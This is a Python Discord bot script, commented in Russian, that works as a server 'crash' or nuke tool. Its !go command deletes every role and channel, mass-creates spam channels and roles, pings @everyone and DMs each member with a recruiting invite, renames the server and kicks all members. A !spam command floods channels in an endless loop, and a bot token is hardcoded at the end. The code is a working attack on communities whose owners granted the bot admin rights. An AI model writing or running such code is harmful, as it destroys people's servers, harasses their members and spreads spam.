import discord
from discord.ext import commands
from discord import Permissions

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents )



bot.remove_command("help")

@bot.command()
async def go(ctx):
        await ctx.message.delete()
        guild = ctx.message.guild

        await ctx.author.send(f"Начинаю краш сервера {guild}!")
        await ctx.author.send(f"LOG: Запуск 1-ого этапа краша: **Удаление ролей, каналов, создание новых ролей и каналов, спам в новые каналы.**") 




        for m in ctx.guild.roles:
            try:
                await m.delete(reason="Краш")
            except:
                pass




        await ctx.author.send(f"LOG: Все роли, которые можно было удалить на сервере {guild} - удалены!")
            


        for channel in ctx.guild.channels:  # собираем
                try:
                        await channel.delete(reason="Краш")  # удаляем
                except:
                        pass



        await ctx.author.send(f"LOG: Все каналы, которые можно было удалить на сервере {guild} - удалены!")

        await ctx.author.send(f"LOG: Создаю каналы на сервере {guild} и спамлю в них.")


        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')
        await guild.create_text_channel('crash-by-ROVgr')

        for channel in ctx.guild.text_channels:
            try:
              await channel.send("СЕРВЕР КРАШНУТ С ЛЮБОВЬЮ ROVgroup!Входи к нам на сервер! ||@everyone||https://discord.gg/QAqDURd2kb ***Ссылка на бота в сервере***||НЕ МЫ ВИНОВАТЫ ЧТО ВЫ ДОВЕРИЛИ АДМИНА НЕЗНАКОМЦУ||")
            except:
              pass


        await ctx.author.send(f"LOG: Создал каналы и заспамил их на сервере {guild}. Теперь на этом же сервере создаю роли :)")



        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVg")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By Forzel")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")
        await guild.create_role(name="Crash By ROVgr")






        await ctx.author.send(f"LOG: Создал роли на сервере {guild}.")
        await ctx.author.send(f"LOG: Запуск 2-ого этапа краша: **Изменение названия и иконки сервера, спам в личку всем участникам сервера.**") 


        await ctx.author.send(f"LOG: Начинаю спам в личку всем участникам {guild}.")

        for member in ctx.guild.members:
            try:
              await member.send(f"Внимание! Сервер {guild} крашнут! Хочешь так-же? Заходи - https://discord.gg/QAqDURd2kb")
            except:
              pass





        await ctx.author.send(f"LOG: Спам в личку всем участникам {guild} завершен. Теперь поменяю иконку и имя серверу :)")



        with open('\ok.png', 'rb') as f:
             icon = f.read()
        await guild.edit(name='ODNOKLASSNIKI BOT', icon=icon) 





        await ctx.author.send(f"LOG: Имя и иконка сервера изменены :)")
        await ctx.author.send(f"LOG: Запуск 3-ого этапа краша: **Кик всех участников с сервера**") 




        for m in ctx.guild.members:
          try:
            await m.kick(reason="Краш сервера")
          except:
            pass






        await ctx.author.send(f"LOG: Все участники сервера кикнуты.")
        await ctx.author.send(f"Данный сервер полностью крашнут. Спасибо за использование бота :3 ( cepвер - https://discord.gg/QAqDURd2kb )")
        await ctx.author.send("------------------------------------------------------------------------------------------------")
        
@bot.command()
async def spam(ctx):
    while True:
        for channel in ctx.guild.text_channels:
            try:
              await channel.send("СЕРВЕР КРАШНУТ С ЛЮБОВЬЮ ROVgroup!Входи к нам на сервер! ||@everyone||https://discord.gg/QAqDURd2kb ***Ссылка на бота в сервере***||НЕ МЫ ВИНОВАТЫ ЧТО ВЫ ДОВЕРИЛИ АДМИНА НЕЗНАКОМЦУ||")
            except:
                continue

bot.run("ODEzMDQ1OTEyMzg1MDkzNjY0.YDJmAw.htB3PinoZPSMpl2aZxnfX8hG8oY")